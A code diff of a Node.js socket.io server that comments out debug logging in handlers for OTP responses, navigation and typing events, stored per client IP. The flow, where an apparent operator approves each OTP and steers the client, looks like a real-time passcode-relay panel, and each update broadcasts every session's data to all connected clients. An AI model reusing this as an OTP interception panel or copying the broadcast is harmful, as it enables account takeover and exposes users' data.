@@ -379,15 +379,15 @@ io.on('connection', (socket, req) => {
     socket.on('sendOTPResponse', (data) => {
         if (sessionStore.has(data.ip)) {
             let userDetails = sessionStore.get(data.ip);
-            console.log(userDetails);
-            console.log(userDetails.getUserDataNavig);
+            //console.log(userDetails);
+            //console.log(userDetails.getUserDataNavig);
             if(data.res == 'good'){
-                console.log(data.ip)
-                console.log(userDetails.getUserDataNavig.next)
+                //console.log(data.ip)
+                //console.log(userDetails.getUserDataNavig.next)
                 io.to(data.ip).emit('OTPResponse', {res:true, next: userDetails.getUserDataNavig.next})
            } else {
-                console.log(data.ip)
-                console.log(userDetails.getUserDataType.navig)
+                //console.log(data.ip)
+                //console.log(userDetails.getUserDataType.navig)
                 io.to(data.ip).emit('OTPResponse', {res:false, next: userDetails.getUserDataType.navig})
            }
         }
@@ -399,12 +399,12 @@ io.on('connection', (socket, req) => {
             if(!userDetails.getUserDataNavig){
                 userDetails.getUserDataNavig = {};
             } 
-                console.log('nextNavig')
-                console.log(data)
-                console.log(userIP)
+                //console.log('nextNavig')
+                //console.log(data)
+                //console.log(userIP)
     
                 userDetails.getUserDataNavig = data
-                console.log(userDetails)
+                //console.log(userDetails)
                 sessionStore.set(userIP, userDetails);
                 io.emit('join', Array.from(sessionStore.entries()));
             
@@ -417,12 +417,12 @@ io.on('connection', (socket, req) => {
             if(!userDetails.getUserDataType){
                 userDetails.getUserDataType = {};
             } 
-                console.log('typeOTP')
-                console.log(data)
-                console.log(userIP)
+                //console.log('typeOTP')
+                //console.log(data)
+                //console.log(userIP)
     
                 userDetails.getUserDataType = data
-                console.log(userDetails)
+                //console.log(userDetails)
                 sessionStore.set(userIP, userDetails);
                 io.emit('join', Array.from(sessionStore.entries()));
             
